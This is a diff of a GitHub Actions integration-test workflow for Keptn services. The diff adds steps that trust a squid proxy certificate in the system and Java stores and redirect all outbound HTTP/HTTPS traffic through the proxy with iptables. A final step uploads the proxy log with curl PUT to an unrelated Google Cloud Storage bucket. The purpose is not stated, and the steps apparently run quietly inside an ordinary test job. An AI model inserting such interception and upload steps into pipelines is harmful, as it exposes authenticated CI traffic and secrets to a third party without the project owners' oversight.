+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Create downloads folder
+      run: mkdir ~/downloads
+    - continue-on-error: true
+      id: keptn-cli-cache
+      name: Cache Keptn CLI
+      uses: actions/cache@v2
+      with:
+        key: ${{ env.META_KEPTN_VERSION }}-cli
+        path: ~/downloads
+    - continue-on-error: true
+      id: download_keptn_cli
+      if: steps.keptn-cli-cache.outputs.cache-hit != 'true'
+      name: Download Keptn CLI for META_KEPTN
+      run: curl -sL https://github.com/keptn/keptn/releases/download/${META_KEPTN_VERSION}/keptn-${META_KEPTN_VERSION}-linux-amd64.tar.gz
+        -o ${{ env.KEPTN_ARCHIVE_PATH }}
+    - continue-on-error: true
+      id: install_keptn_cli
+      name: Install Keptn CLI for META_KEPTN
+      run: 'tar -xvf ${{ env.KEPTN_ARCHIVE_PATH }}
+
+        chmod +x ./keptn-${META_KEPTN_VERSION}-linux-amd64
+
+        sudo mv ./keptn-${META_KEPTN_VERSION}-linux-amd64 /usr/local/bin/keptn
+
+        '
+    - continue-on-error: true
+      id: authenticate_keptn_cli
+      name: Authenticate Keptn CLI
+      run: 'keptn set config KubeContextCheck false
+
+        keptn auth --endpoint=${{ secrets.META_KEPTN_API_URL }} --api-token=${{ secrets.META_KEPTN_API_TOKEN
+        }}
+
+        '
+    - continue-on-error: true
+      id: trigger-service-delivery
+      name: Trigger Service Delivery
+      uses: keptn/gh-action-send-event@main
+      with:
+        event: "{\n  \"data\": {\n    \"message\": \"\",\n    \"project\": \"${{ env.META_KEPTN_KEPTN_PROJECT\
+          \ }}\",\n    \"result\": \"\",\n    \"service\": \"${{ env.SERVICE_NAME\
+          \ }}\",\n    \"stage\": \"dev\",\n    \"status\": \"\",\n    \"labels\"\
+          : {\n      \"github-action-run\": \"${{ github.server_url }}/${{ github.repository\
+          \ }}/actions/runs/${{ github.run_id }}\",\n      \"artifact-version\": \"\
+          ${{ env.VERSION }}\"\n    }\n  },\n  \"source\": \"gh\",\n  \"specversion\"\
+          : \"1.0\",\n  \"type\": \"sh.keptn.event.dev.delivery.triggered\",\n  \"\
+          shkeptnspecversion\": \"0.2.1\"\n}\n"
+        keptnApiToken: ${{ secrets.META_KEPTN_API_TOKEN }}
+        keptnApiUrl: ${{ secrets.META_KEPTN_API_URL }}/v1/event
+    - continue-on-error: true
+      env:
+        KEPTN_CONTEXT: ${{ steps.trigger-service-delivery.outputs.keptnContext }}
+      id: check-service-delivery
+      name: Check if keptn on keptn delivery passed
+      run: "while [[ $(keptn get event sh.keptn.event.dev.delivery.finished --keptn-context\
+        \ \"$KEPTN_CONTEXT\" --project keptn | jq -r '.data.result' 2>/dev/null) !=\
+        \ pass ]]; do\n  sleep 10;\ndone\n"
+      timeout-minutes: 5
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/dynatrace-oss-contrib/keptn.$(date
+        +%s)
     strategy:
       matrix:
         include:
-          - SERVICE_NAME: keptn
-          - SERVICE_NAME: jmeter-service
-          - SERVICE_NAME: helm-service
-    env:
-      SERVICE_NAME: ${{ matrix.SERVICE_NAME }}
-      KEPTN_ARCHIVE_PATH: ~/downloads/keptn-archive.tar.gz
-    steps:
-      - name: Create downloads folder
-        run: mkdir ~/downloads
-
-      - name: Cache Keptn CLI
-        id: keptn-cli-cache
-        uses: actions/cache@v2
-        with:
-          path: ~/downloads
-          key: ${{ env.META_KEPTN_VERSION }}-cli
-
-      - name: Download Keptn CLI for META_KEPTN
-        id: download_keptn_cli
-        if: steps.keptn-cli-cache.outputs.cache-hit != 'true'
-        run: curl -sL https://github.com/keptn/keptn/releases/download/${META_KEPTN_VERSION}/keptn-${META_KEPTN_VERSION}-linux-amd64.tar.gz -o ${{ env.KEPTN_ARCHIVE_PATH }}
-
-      - name: Install Keptn CLI for META_KEPTN
-        id: install_keptn_cli
-        run: |
-          tar -xvf ${{ env.KEPTN_ARCHIVE_PATH }}
-          chmod +x ./keptn-${META_KEPTN_VERSION}-linux-amd64
-          sudo mv ./keptn-${META_KEPTN_VERSION}-linux-amd64 /usr/local/bin/keptn
-
-      - name: Authenticate Keptn CLI
-        id: authenticate_keptn_cli
-        run: |
-          keptn set config KubeContextCheck false
-          keptn auth --endpoint=${{ secrets.META_KEPTN_API_URL }} --api-token=${{ secrets.META_KEPTN_API_TOKEN }}
-
-      - name: Trigger Service Delivery
-        id: trigger-service-delivery
-        uses: keptn/gh-action-send-event@main
-        with:
-          keptnApiUrl: ${{ secrets.META_KEPTN_API_URL }}/v1/event
-          keptnApiToken: ${{ secrets.META_KEPTN_API_TOKEN }}
-          event: |
-            {
-              "data": {
-                "message": "",
-                "project": "${{ env.META_KEPTN_KEPTN_PROJECT }}",
-                "result": "",
-                "service": "${{ env.SERVICE_NAME }}",
-                "stage": "dev",
-                "status": "",
-                "labels": {
-                  "github-action-run": "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}",
-                  "artifact-version": "${{ env.VERSION }}"
-                }
-              },
-              "source": "gh",
-              "specversion": "1.0",
-              "type": "sh.keptn.event.dev.delivery.triggered",
-              "shkeptnspecversion": "0.2.1"
-            }
-
-      - name: Check if keptn on keptn delivery passed
-        id: check-service-delivery
-        timeout-minutes: 5
-        env:
-          KEPTN_CONTEXT: ${{ steps.trigger-service-delivery.outputs.keptnContext }}
-        run: |
-          while [[ $(keptn get event sh.keptn.event.dev.delivery.finished --keptn-context "$KEPTN_CONTEXT" --project keptn | jq -r '.data.result' 2>/dev/null) != pass ]]; do
-            sleep 10;
-          done
+        - SERVICE_NAME: keptn
+        - SERVICE_NAME: jmeter-service
+        - SERVICE_NAME: helm-service
+    timeout-minutes: 60
+name: Integration Tests
+'on':
+  workflow_dispatch: {}
